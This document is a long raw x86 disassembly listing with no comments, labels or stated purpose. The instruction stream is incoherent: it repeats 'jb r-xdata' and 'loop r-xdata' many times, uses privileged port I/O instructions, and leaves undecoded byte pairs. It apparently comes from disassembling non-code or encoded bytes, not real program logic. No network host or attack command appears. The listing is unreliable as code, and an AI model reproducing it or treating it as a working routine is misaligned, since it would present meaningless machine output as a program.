sbb eax 0xb51d0697
jb r-xdata
loop r-xdata
sbb eax 0x88ba7272
sbb eax 0xa688eab4
rcr [ 0xffffffffaec6a66f ] 0x1
mov ch 0xb2
or ah dh
pop eax
sbb eax 0xa680b1d
out 0xb al
mov al [ 0x721d1d2a ]
sbb al 0x84
imul ebx [ edi - 0x7be22efe ] 0x6b
loop r-xdata
jb r-xdata
loop r-xdata
or [ edi ] 0xf6a46bb5
or dl [ esi + 0x668a1d1d ]
sbb eax 0x8aa22661
sbb al 0x82
jb r-xdata
jb r-xdata
push es
sbb eax 0x1db1feb5
xchg edi eax
or bl [ 0xffffffffe2e27a75 ]
loop r-xdata
in eax dx
pop di
sbb eax 0xeebfdb1d
in eax dx
0x1d5f 0x691d
loop r-xdata
jb r-xdata
push ds
xchg [ ebx + ebp * 2 - 0x7745f559 ] eax
mov [ ebx + ebp * 2 + 0xbba08a7 ] es
lodsd [ esi ]
adc bl [ 0x7272721d ]
jb r-xdata
or eax ebx
and [ 0x7272721d ] ebx
jb r-xdata
mov dl 0x84
imul esp [ ebp - 0x591e7b20 ] 0x55edfec6
and dh [ edx - 0x23f5db97 ]
daa
sbb eax 0xee26611d
push ss
in eax dx
pushad
adc eax 0x6f1d1d03
cmpsd [ esi ] [ edi ]
add dh [ edx + 0x1db6941d ]
mov edi 0xba66edee
loop r-xdata
loop r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
jb r-xdata
in eax dx
imul ecx [ esi ] 0xd1b5b3b3
sbb eax 0x1d28360b
sbb eax 0x72727272
jb r-xdata
imul esp [ esi + 0x2267fac6 ] 0xffffffed
out dx al
and ax 0x1d5a
sbb eax 0xe2ea9d61
xchg edi eax
sbb eax 0x25690e97
or ebp [ edx + 0x72e2e2f2 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
pop ss
mov dl ah
fcom [ 0x72721d1d ]
jb r-xdata
or cl [ edx ]
jb r-xdata
xor [ edx + 0x1d ] bl
sbb eax 0xc6c69e61
loop r-xdata
cli
and ch ch
imul ebp [ edx ] 0x1d27260a
sbb eax 0xe2ebda0b
loop r-xdata
mov dl 0xd9
mov dh 0xea
mov dl 0xed
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xba72721d
jb r-xdata
xor eax 0xee8a1d1d
jb r-xdata
push ss
jb r-xdata
sbb eax 0xe252741d
loop r-xdata
loop r-xdata
sbb eax 0x6bee2661
cmpsb [ esi ] [ edi ]
imul esp [ edi - 0x33774504 ] 0xffffffbc
mov [ edi - 0x3d58947c ] al
imul esp [ esp + eax * 4 ] 0xbc0a76b
loope r-xdata
jb r-xdata
and cl [ ebx ]
outsb
add ebx [ 0xffffffffdb72721d ]
cmpsd [ esi ] [ edi ]
or ecx [ eax + 0x5c ]
mov [ edi + 0xca76b84 ] al
mov edx 0x2a698c88
jb r-xdata
jb r-xdata
sbb eax 0x214dee8a
jb r-xdata
or esp [ ebx + ecx ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
popad
push cs
mov cl 0xb5
sbb eax 0xe2e25674
je r-xdata
imul edi [ edi + 0x135b0b1e ] 0x1d
sbb eax 0x72727272
imul esp [ esi - 0x1597193a ] 0x21fd0ba2
sbb eax 0xedaa721d
push ebp
loop r-xdata
sbb eax 0x7272721d
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xb
mov [ esi ] ss
push edx
jb r-xdata
jb r-xdata
out dx al
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
mov [ 0xb1ea76b ] al
and bl [ eax ]
scasd [ edi ]
push ds
mov bl 0xb2
mov al ah
mov bh [ edi + ecx * 4 ]
xor eax 0xe9d80b41
loop r-xdata
sub ebx [ 0x1e87611d ]
or ebx [ 0xffffffffbe66ed1d ]
jb r-xdata
sbb eax 0xbe66ed1d
and al 0xb
jb r-xdata
jb r-xdata
jb r-xdata
push cs
loop r-xdata
mov ecx 0xb469212b
outsd
loop r-xdata
or ebx [ esi + 0xf ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
pop edx
sbb eax 0xc69e611d
in ax 0xe2
loop r-xdata
test eax 0x58100b6e
sbb eax 0x69b7721d
shl [ edx ] 0x1
fistp [ edi + 0x309d0b1e ]
sbb eax 0x7272721d
stosd [ edi ]
jb r-xdata
jb r-xdata
or esi edx
in al dx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x2bbe66ed
sbb eax 0x1e87611d
mov cl ah
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor bl [ edi + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x1d
je r-xdata
sbb eax 0x99638a1d
jb r-xdata
push ebp
or edi edx
or bh [ edx + 0x6b848388 ]
cmpsd [ esi ] [ edi ]
or [ ebx ] cl
cli
cmp [ edx + 0x6b848688 ] 0xa7
imul esp [ edx + ecx ] 0x1d1d2e17
mov ebx 0xdac6a66f
imul esp [ edi + 0x2a890b06 ] 0x1d
sbb eax 0xb80bf51d
pop edi
sbb eax 0x7272721d
jb r-xdata
mov ch 0x6b
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
imul esp [ edi - 0x58945de2 ] 0x18220b1e
shl [ eax ] cl
pop bx
add ebx [ 0x24170b1d ]
sbb eax 0xd2a46b1d
or bh [ ecx - 0x75e2e2ce ]
sbb eax 0x24170b1d
jb r-xdata
jb r-xdata
jb r-xdata
or ebx eax
jmp 0x72b8b4cf
loop r-xdata
jb r-xdata
mov cl 0x1d
xchg esi eax
ffreep st1
mov ah [ ebx - 0x67 ]
jb r-xdata
imul ebx [ edi + 0x59f60b1a ] 0x1d
movsb [ edi ] [ esi ]
jb r-xdata
test [ ebx - 0x51 ] ch
dec edx
mov ah 0x6f
mov bh 0x69
push cs
or ecx [ esi + 0x7272e2e2 ]
jb r-xdata
arpl [ ecx + 0xbb5c1df ] bx
or edx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x52741d1d
xchg [ ebx + ebp * 2 - 0x7745f559 ] al
add [ ebx + ebp * 2 - 0x5f4f759 ] 0x55
loop r-xdata
je r-xdata
jb r-xdata
cdq
jb r-xdata
or bh [ eax ]
xor eax 0x2f8a1d1d
mul dl
loop r-xdata
fld [ edi - 0x5b9b1212 ]
outsd
scasd [ edi ]
or esi eax
push eax
sbb eax 0x7272721d
jb r-xdata
inc [ eax ]
sbb eax 0x66ed721d
lds ebp [ esi ]
sbb eax 0x36af6f1d
or esi eax
imul ebx [ edi + 0xfe0b74 ] 0x1d
sbb eax 0xc566ed72
sbb eax 0x36af6f1d
imul ebx [ edi + 0x36 ] 0x1f
sbb eax 0xf2b41d1d
or ebp eax
push cs
sbb eax 0x6f1b691d
outsd
sub bl [ edi ]
pop esi
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
sbb eax 0xbb1721d
pop ss
loop r-xdata
jb r-xdata
shl [ ebp + 0x1d30d20b ] 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x5c
sbb eax 0x7272721d
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
sbb eax 0xdf99638a
jb r-xdata
mov dl [ edx + 0x5c ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x3e0a0a1d
sbb eax 0x17bb0b1d
imul ebx [ ebx ] 0x1f2a6f6f
jb r-xdata
sbb eax 0xe2e24e74
or edx edx
xor [ 0x7272721d ] bl
jb r-xdata
cmpsd [ esi ] [ edi ]
adc al 0xba
mov [ esp + eax * 4 - 0x45e55895 ] al
mov ah cl
test [ ebx - 0x59 ] ch
sbb [ edx + 0x1d1dca0b ] bh
sbb eax 0x32a76b84
or ebx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
insd
adc [ 0x7272721d ] ebx
mov cl 0xb
jb r-xdata
pop esp
jb r-xdata
loop r-xdata
mov esi 0x900af6c6
sub ebx [ 0xb1dd11d ]
jb r-xdata
sbb eax 0x9e0a96b4
pop edi
sbb eax 0xed22671d
in eax 0xe2
je r-xdata
xor cl [ ebx ]
jne r-xdata
sbb eax 0x55edaa72
or esp [ ecx - 0x18 ]
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
cli
in eax dx
xor dl [ fs : ecx + 0x1d ]
sbb eax 0xf2c68661
jb r-xdata
sbb eax 0x2267aeb2
in eax dx
insb
sub ebx [ 0x526f6f1d ]
pop ds
sbb eax 0x20390a1d
sbb eax 0x169f6f1d
outsd
outsb
pop ds
sbb eax 0x9f6b841d
je r-xdata
outsd
cmpsd [ esi ] [ edi ]
test [ cs : ebx - 0x69 ] ch
dec esi
imul edx [ edi + 0x6b84b2ea ] 0x6fb44aaf
jb r-xdata
jb r-xdata
in eax dx
and bl bl
lahf
push ds
or ebx [ ebp + 0x721d1d30 ]
jb r-xdata
jb r-xdata
or ebp [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xe2e24e74
cmpsd [ esi ] [ edi ]
push ds
push 0xea6aeeaf
sbb eax 0x8aee2661
loop r-xdata
mov cl 0x1d
loop r-xdata
in al dx
loop r-xdata
jb r-xdata
jb r-xdata
fsubrp st1
in eax dx
aaa
pop esi
sbb eax 0xc69e611d
mul bl
in eax dx
sub [ esi + 0x1d ] bl
sbb eax 0x1d38b10b
sbb eax 0x1d130a0a
sbb eax 0x19126f6f
sbb eax 0x23880a1d
mov dl 0x6f
jb r-xdata
imul esi [ edi - 0x47c49660 ] 0xb
lahf
or ebx [ 0xffffffff8495881d ]
sbb eax 0x721d1d39
jb r-xdata
movsb [ edi ] [ esi ]
sbb bl [ 0x7272721d ]
jb r-xdata
or al [ eax + 0x9 ]
sbb eax 0xed22671d
clc
sbb ebx [ 0x3a9f6f1d ]
outsd
outsd
push edx
pop ds
sbb eax 0xe1730b1d
loop r-xdata
outsd
lahf
push ss
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or esp [ edx ]
sbb [ 0x7272721d ] bl
sub ecx [ bp + di ]
mov ch 0xb
jb r-xdata
ror [ eax - 0x79774580 ] cl
test [ ebx - 0x59 ] ch
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
or cl [ edx ]
sbb eax 0x17bb0b1d
loop r-xdata
and al 0x1d
sbb eax 0xad2a46b
mov ecx 0x8a1d1d32
loop r-xdata
sbb eax 0xe2e26275
loop r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0xb
jb r-xdata
cmpsd [ esi ] [ edi ]
and [ 0xffffffffa76b841d ] ebx
or cl [ ebx ]
imul ebx [ ecx + 0x1d ] 0xb2941d1d
test al 0x69
cmp cl [ ebx ]
jb r-xdata
imul edi [ edi - 0x48947bfa ] 0xffffffa0
jb r-xdata
loop r-xdata
mov edx 0x1d391d0b
sbb eax 0x72727272
or bh [ ecx ]
and [ 0x169f6f1d ] bl
mov eax [ 0x3264edfa ]
push ecx
sbb eax 0xc686611d
loop r-xdata
mov bh 0xb
popad
call 0x72b8b4ed
jb r-xdata
outsd
push edx
pop ds
sbb eax 0xa769b21d
0xb21de288 0x67ae
shl [ edx ] 0x1
jb r-xdata
sbb eax 0x7272721d
mov cl 0x1d
xchg esi eax
and eax 0xe3e2e0e2
loop r-xdata
0x691d1d05 0xb35
sbb eax 0x1a69e6b4
mov [ esi + 0x19180bb5 ] al
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
or [ ebx ] cl
mov cl 0x2a
sbb eax 0x7272721d
jb r-xdata
dec edx
adc eax 0xb41d1d1d
0xcea155ed 0x6784
mov dl 0xb
jb r-xdata
or [ eax ] 0x67bb1d1d
jb r-xdata
jmp 0x7262f137
push es
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
test [ ebx - 0x59 ] ch
in eax dx
pop si
out dx eax
loop r-xdata
jb r-xdata
xchg edi eax
or ch [ ebx - 0x59 ]
sbb bl [ 0x2267b6b5 ]
in eax dx
xor ax 0xe2e2
loop r-xdata
loope r-xdata
and eax 0xafb40aa7
test eax 0xbf80bb4
sbb eax 0xf888b11d
mov cl 0xb
push edx
xor al 0x1d
sbb eax 0x3ebf6b84
mov ecx 0x6b848188
mov edi 0x8438693c
imul edi [ edi - 0x2b7746fe ] 0xffffff84
imul ebx [ edi - 0x297742f6 ] 0xffffff84
imul esi [ edi - 0x60947b32 ] 0x8
mov ebp 0x1d5e130b
popad
lahf
out dx al
loop r-xdata
fistp [ esi + 0x66edd2c6 ]
in eax dx
jb r-xdata
mov [ 0xbe2e2ea ] al
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
jb r-xdata
imul edi [ ebx ] 0x30e90bb8
sbb eax 0xb972721d
mov bh 0xa0
jb r-xdata
mov al [ 0xbb83b69 ]
mov edi 0xb76b8406
jb r-xdata
push 0xffffffb2
mov cl 0xb1
mov dh ah
mov cl 0xb
mov [ edi ] dh
or dl [ esi + 0x671d1d02 ]
and cl [ ebx ]
daa
adc bl [ 0x7272721d ]
mov dh ah
or edi [ edi ]
adc bl [ 0x7272721d ]
jb r-xdata
sbb eax 0xb35691d
out 0x56 eax
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
arpl [ esi ] cx
int1
and [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x17270b1d
jb r-xdata
aad 0xea
loop r-xdata
mov ebx 0x66ed2267
mov [ 0xbe2e2ea ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov [ 0x1d1c750b ] al
sbb eax 0x84727272
test [ ebx - 0x59 ] ch
xor al 0x84
imul ebp [ edi - 0x457877ea ] 0xffffff88
mov es [ ebx + ebp * 2 - 0x7745eb59 ]
test [ ebx + ebp * 2 - 0x7745e559 ] al
imul ecx [ esi ] 0xe0620e63
loop r-xdata
cwd
das
sbb eax 0x9961841d
movsb [ edi ] [ esi ]
loop r-xdata
and ch ch
mov bh 0x69
push cs
int3
or al [ ecx - 0x44e2e2f8 ]
and ch ch
sbb eax 0x6b84721d
mov bh 0xc
mov [ edi + 0x6b843369 ] cl
or esp [ edi ]
jb r-xdata
and ch ch
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb5
or ebx [ ecx - 0x1b ]
loop r-xdata
cmp edi [ eax + 0x1d30e90b ]
jb r-xdata
sbb eax 0x84b97272
imul edi [ edi - 0x77c7965c ] 0xffffff81
test [ ebx - 0x41 ] ch
stosb [ edi ]
mov ecx 0xa8bf6b84
imul edi [ edx ] 0x1d21a70b
sbb eax 0xaa76b84
or ebp [ ecx + 0x59 ]
sbb eax 0xb2941d1d
mov eax 0x1d30e90b
jb r-xdata
mov ch 0x88
jb r-xdata
jb r-xdata
fucomi st0
jb r-xdata
jb r-xdata
test cl bl
sub eax 0x1d0a8c0b
sbb eax 0x72727272
sbb eax 0xe855ed1d
jpe r-xdata
jb r-xdata
loop r-xdata
mov cl 0xb4
mov [ esi + 0x1d56960b ] ah
sbb eax 0xc69edb72
shr ch cl
in ax dx
pop ss
jb r-xdata
push ebx
sbb eax 0x7272721d
jb r-xdata
imul esi [ edi - 0x58947bd4 ] 0x34
test [ ebx - 0x51 ] ch
push ss
mov [ edi - 0x7b717746 ] al
imul esp [ edi - 0x7b7745ec ] 0xffffff84
imul esp [ edi - 0x337745e6 ] 0xffffff84
imul esp [ edi - 0x35f445e8 ] 0x1d
sbb eax 0xa76b841d
xor cl [ ebx ]
pop ds
test [ ebx - 0x41 ] ch
movsb [ edi ] [ esi ]
imul edi [ eax ] 0x6b848188
mov edi 0x6b84b9aa
mov edi 0xb3a69a8
or ebp ecx
jb r-xdata
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
push cs
jpe r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
imul esp [ esi + 0x1d2f100a ] 0x1d
popad
mov [ es : 0x1d33420b ] al
sbb eax 0x72727272
jb r-xdata
loop r-xdata
xor [ 0xffffffffb972721d ] bl
push ds
test [ ebx - 0x59 ] ch
sbb eax 0x1a0ba21d
jmp r-xdata
aaa
sbb al 0x8a
out 0xe3 al
loop r-xdata
imul esp [ edi - 0x7bdd2ee2 ] 0x6b
cmpsd [ esi ] [ edi ]
cmp bh [ edx + 0x32698f88 ]
mov [ ebx + 0x6b842369 ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
arpl [ esi ] cx
lea eax [ ebx + ebp * 2 - 0x7745c359 ]
jb r-xdata
jb r-xdata
sbb bl [ 0xffffffffed22671d ]
out 0xe2 ax
loop r-xdata
xor dh [ edx - 0x4d995891 ]
or ecx [ edx + 0x15 ]
popad
sbb eax 0xeab41d1d
in eax dx
push ebp
mov eax [ 0x226784ce ]
in eax dx
sbb eax 0x11878a1d
mov ch 0x15
mov ch 0x6b
movsb [ edi ] [ esi ]
cmpsb [ esi ] [ edi ]
or dl [ eax ]
das
sbb eax 0xa226611d
or eax [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
or ebx ebx
imul esp [ ebx ] 0x3aa76b84
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1d2e170b
sbb eax 0x72727272
0x691d1d05 0xb35
test cl bl
adc ebp ebp
mov cl 0xb4
mov ch 0xb
loope r-xdata
mov [ ebx + ebp * 2 - 0x7745fd59 ] es
test [ edx - 0x1d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
adc dl cl
xor [ ebx ] cl
jecxz r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x16 ] ch
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0xe637272
inc eax
imul ebp [ edi + 0x6a76906 ] 0x23
sbb bh ch
dec edx
jecxz r-xdata
retn 0x1d11
imul esp [ edi - 0x737745c4 ] 0xffffff84
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
in eax dx
jb r-xdata
jb r-xdata
or esp ebx
xor al 0x1d
sbb eax 0xed727272
fisubr [ es : edi - 0x59 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
sahf
out 0xe2 al
loop r-xdata
sbb eax 0x6372721d
mov dl 0xe0
loop r-xdata
push cs
jb r-xdata
jb r-xdata
xchg [ esi ] eax
mov cl 0x84
pop edx
jecxz r-xdata
push 0x34
sbb eax 0xe46e0b1d
loop r-xdata
cmp al 0xba
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x61 ] ch
or [ ebp + 0x1d5e130b ] bh
or ch [ edi + 0x19 ]
sbb eax 0xe40ba21d
xor [ 0x2055ed1d ] bl
outsd
mov edx 0xe72289e0
mov [ ecx ] edi
out 0x24 eax
out 0xd1 al
mov ch [ ecx - 0x41 ]
push ds
imul edi ecx 0xbe6b33e1
shr cl cl
test cl bl
jb r-xdata
mov edx 0x32698f88
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
out dx al
outsd
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45fd5895 ] cl
jb r-xdata
sbb eax 0x64ed721d
jb r-xdata
jb r-xdata
jb r-xdata
jpe r-xdata
loop r-xdata
jb r-xdata
imul esp [ esi + 0x530bfec6 ] 0x19
jb r-xdata
sbb eax 0x17c50b1d
sbb eax 0x2a61721d
adc al 0x5
sbb eax 0xed22671d
sub dl [ edx + 0x25c28e90 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x12
shl [ eax ] 0x1
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
xor cl [ ebx ]
jb r-xdata
mov [ ecx + 0x698388bb ] dl
jb r-xdata
jb r-xdata
xchg edx eax
jb r-xdata
nop
jb r-xdata
add bh [ edx - 0x3df47878 ]
pop edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ecx ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x23698388
jb r-xdata
sbb eax 0xb41d721d
or edx [ ebx + 0x19 ]
jb r-xdata
mov es dx
jb r-xdata
retn 0xa725
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] ebx
mov edx 0xc20b8788
jb r-xdata
push ebp
jb r-xdata
pop ebp
mov eax 0x84e2e295
fldcw [ 0x1d0a8c0b ]
or bl [ 0xffffffffe855ed1d ]
jb r-xdata
jb r-xdata
jb r-xdata
sub [ ecx + 0x23 ] 0xffffff84
jb r-xdata
0xf6c6bedb 0x66ed
sbb [ 0xffffffffb41d721d ] ebx
jb r-xdata
and eax 0x9b8a2ea7
xchg edx eax
xchg [ 0xffffffff949032a7 ] esp
retn 0xac2
jb r-xdata
cmpsd [ esi ] [ edi ]
mov bl [ cs : ebx - 0x58da786e ]
xor dl [ eax + 0xac2c294 ]
iretd
mov dl 0xa
xor [ edx + 0x1d ] dl
sbb eax 0x61f2a769
sbb eax 0x7272721d
jb r-xdata
cmp [ ecx ] 0x1d
in eax dx
xchg [ ebx ] ecx
jb r-xdata
push ebp
jb r-xdata
or esp [ 0x721d1d52 ]
test [ ebx - 0x41 ] ch
sbb [ eax + 0xb386981 ] cl
sub edx [ ecx + 0x1d ]
sbb eax 0x7a64ed72
xor ecx [ ebx ]
pop ebx
pop eax

sbb eax 0x72727221
jb r-xdata
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c559 ]
jb r-xdata
sbb eax 0xeab41d72
jb r-xdata
push cs
sbb eax 0x6372721d
xchg [ edx ] ebx
loop r-xdata
or dh [ eax ]
push edx
sbb eax 0xf2a7691d
popad
sbb eax 0x7272721d
jb r-xdata
out dx al
or esp [ esi + 0x55 ]
xchg esp eax
mov dl 0xb
push esi
mov dl 0x1d
cmpsd [ esi ] [ edi ]
mov dl 0x1d
rcl [ ebx + 0x1d ] 0x1
sbb eax 0x6fee2661
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x707745c6 ] 0x69
jb r-xdata
push ebp
retn 0x94aa
cmpsd [ esi ] [ edi ]
cmp cl [ ebp + 0x25848d91 ]
cmpsd [ esi ] [ edi ]
xchg esi eax
retn 0x94aa
sbb cl [ edx ]
jb r-xdata
jb r-xdata
and eax 0x90922aa7
jb r-xdata
jb r-xdata
pop esi
sbb eax 0x2eb60b1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
jb r-xdata
test [ ebx ] ebp
jb r-xdata
jb r-xdata
jb r-xdata
call 0xffffffff88b8b9e0
mov [ edi - 0x24f4cd97 ] cl
jb r-xdata
0xe2e72a0b 0x72e2
in eax dx
mov ch 0xb5
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
imul esi [ edx ] 0xe2e8db0b
jb r-xdata
sbb eax 0xd2b41db2
outsd
sub bl [ bx ]
sbb eax 0x3e1a0b1d
sbb eax 0x7272721d
shr [ ebx ] 0x1
and ch ch
jpo r-xdata
cwde
push edx
sbb eax 0x676fb11d
dec esi
mov ch 0xb
jb r-xdata
and eax 0xafaf3aa7
mov edx 0x3ea72587
jb r-xdata
cli
jb r-xdata
loopne r-xdata
jb r-xdata
loop r-xdata
mov [ ebp + 0x3ca76b84 ] cl
jb r-xdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
or eax eax
dec ebp
sbb eax 0xa725721d
or dh [ edi + ebp * 4 - 0x58da4b57 ]
push cs
scasd [ edi ]
test eax 0xa725afb4
mov edx 0x25b48c87
out dx eax
xor [ 0x7272721d ] bl
jb r-xdata
cmp ch [ edi + 0x2587baaf ]
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
xchg esi eax
mov [ bx ] ss
or dl [ eax + 0x22671d1d ]
in eax dx
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x971db21d
or [ ebx - 0x114896e3 ] 0xa
add ebp [ 0x1db21d1d ]
xchg edi eax
dec [ ebx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf93a151d
and bh [ ebx + 0x212b3a15 ]
jb r-xdata
test [ ebx - 0x61 ] ch
pop esp
imul ebx [ ecx ] 0x229f6b84
or eax [ edi + 0xd ]
sbb eax 0xcc88ba1d
mov ebp 0x3b0b8788
add [ 0xffffffff8472721d ] ebx
imul esp [ edi - 0x50947be2 ] 0x14
mov ebx 0xb206a76f
imul esp [ edi - 0x50947b16 ] 0x2b850a1a
push ebx
jb r-xdata
ror [ ebx ] 0x1
and eax 0x721d1d52
sbb eax 0x55ed721d
jb r-xdata
jb r-xdata
pop edi
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
adc al 0x1d
or bl [ eax - 0x4ee2e2ae ]
outsd
dec esi
jb r-xdata
and eax 0x918d3aa7
lea eax [ ebp - 0x3d69c159 ]
stosb [ edi ]
xchg esp eax
or edi [ ebp ]
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ esi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
sbb eax 0xe697272
or eax [ ecx - 0x1c ]
loop r-xdata
fstp [ esi + 0x66edf6c6 ]
mov [ esi + 0x1d ] bl
sbb eax 0x1d2eb60b
sbb eax 0x72727272
jb r-xdata
mov ah 0xea
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ edx + ebp * 2 - 0x1e ] 0xffffffe2
sub bl [ fs : 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
jb r-xdata
call 0x1d782d5a
outsd
cmpsd [ esi ] [ edi ]
add cl [ ebx ]
movsd [ edi ] [ esi ]
xor al 0x1d
sbb eax 0x9602a725
jb r-xdata
imul esp [ edx + esi * 2 - 0x1e ] 0xffffffe2
loop r-xdata
xchg edi eax
sbb eax 0xad69bb1d
loop r-xdata
sbb eax 0xb5727272
jecxz r-xdata
jb r-xdata
imul esp [ edi - 0x787745fe ] 0xb
jb r-xdata
or edi [ ecx + 0x721d1d23 ]
jb r-xdata
xchg [ edx ] ch
sbb eax 0xe5058a1d
bound edx [ edi ]
mov ch 0xb
mov ecx 0x721d1d23
xchg esi eax
sub bl [ 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
stosd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and al 0xb5
sbb eax 0x962e2f8a
or al [ esi - 0x75e2e2d6 ]
add eax 0xb51762e5
sbb eax 0x1d0a7e0b
sbb eax 0x72727272
jb r-xdata
mov ch 0x6b
sbb eax 0xc81fda8a
jb r-xdata
loope r-xdata
jb r-xdata
mov [ edi + 0x1d11c20b ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
enter 0xb570 0x6b
ficomp [ edi ]
jb r-xdata
or edx [ edx ]
pop ebx
sbb eax 0x7272721d
jb r-xdata
push ss
jb r-xdata
or eax edx
jb r-xdata
or ah [ esi + ebp ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
call 0xffffffffd228bcda
sub [ eax ] cl
sbb eax 0xb22671d
or ecx [ edx + 0x3b ]
sbb eax 0xc6961d1d
cli
imul esp [ edx + ecx ] 0x1d1d253c
mov ebx 0x67eead69
sub ebp ebp
jb r-xdata
sbb eax 0xe2e24e74
jb r-xdata
scasd [ edi ]
imul esp ebx 0xe11aab69
cmp eax 0x24611931
0xf7be6aa0 0xb41
jb r-xdata
jb r-xdata
loop r-xdata
outsd
sbb eax 0xea971d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edx ] 0x1d4f3c0b
sbb eax 0x32a7691d
popad
and dh dh
imul esp [ edi + 0x35e60b1a ] 0x1d
sbb eax 0x72727272
imul esp [ edi + 0x72212bea ] 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x6b
imul esp [ edx + ecx ] 0x1d1d2af3
mov ebx 0x66ed2267
cmpsd [ esi ] [ edi ]
dec esi
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax 0xe2
loop r-xdata
imul edi [ edi + 0xea60a0e ] 0x1d
sbb eax 0x67ee2661
and ch ch
jb r-xdata
loop r-xdata
or bl [ 0x1d1d ]
sbb eax 0x6fea971d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out 0x35 al
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x59230b1d
sbb eax 0x7272721d
jb r-xdata
mov cl 0x1d
je r-xdata
out dx al
imul esp [ edx + esi * 4 + 0x1aa76bb2 ] 0xb216a76f
mov [ 0x1d20b60b ] bl
sbb eax 0xa2266172
mov al [ edi + 0x52 ]
stc
0xbb5
jb r-xdata
jb r-xdata
outsd
or edx [ eax + 0x9 ]
out dx al
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add edx [ bp + di + 0x1d ]
jb r-xdata
mov ch 0xb
mov [ 0x72e2e2e4 ] al
